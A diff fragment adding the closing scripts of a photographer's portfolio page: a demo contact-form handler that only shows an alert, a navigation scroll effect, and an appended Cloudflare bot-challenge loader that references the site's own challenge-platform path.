+
+        // Form submission handler
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Thank you for your message! This is a demo form. In a real website, this would send your message to the photographer.');
+        });
+
+        // Add scroll effect to navigation
+        window.addEventListener('scroll', function() {
+            const nav = document.querySelector('nav');
+            if (window.scrollY > 100) {
+                nav.classList.add('bg-white/98');
+                nav.classList.remove('bg-white/95');
+            } else {
+                nav.classList.add('bg-white/95');
+                nav.classList.remove('bg-white/98');
+            }
+        });
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9687a8c7161ada80',t:'MTc1NDA3NTY3NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
